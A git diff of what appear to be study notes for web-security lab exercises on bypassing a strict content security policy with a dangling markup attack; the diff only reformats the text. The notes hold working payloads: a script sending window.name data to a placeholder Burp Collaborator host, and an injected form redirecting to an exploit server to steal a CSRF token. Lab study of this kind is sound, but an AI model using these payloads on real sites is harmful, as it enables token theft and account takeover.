@@ -2590,8 +2590,8 @@ Content-Type: application/json
   
 **Content security policy (CSP)**
 - Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
-  - Burp steps not working: follow https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/
-  - Email param is vulnerable to XSS
+  - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
+  - Email param is vulnerable to XSS  
     ```
     POST /my-account/change-email
     
@@ -2599,19 +2599,19 @@ Content-Type: application/json
     ```
   - Exploit server  
     ```
-   Burp
-   <script>
+    Burp
+    <script>
 	if(window.name) {
 			new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
 			} else {
 	     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
 	}
-   </script>
+    </script>
 
-   Solution
-   <script>
+    Solution
+    <script>
 	location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
-   </script>
+    </script>
     ```
   - copy the CSRF token from 'Poll Now'
   - Generate CSRF PoC and replace the CSRF token
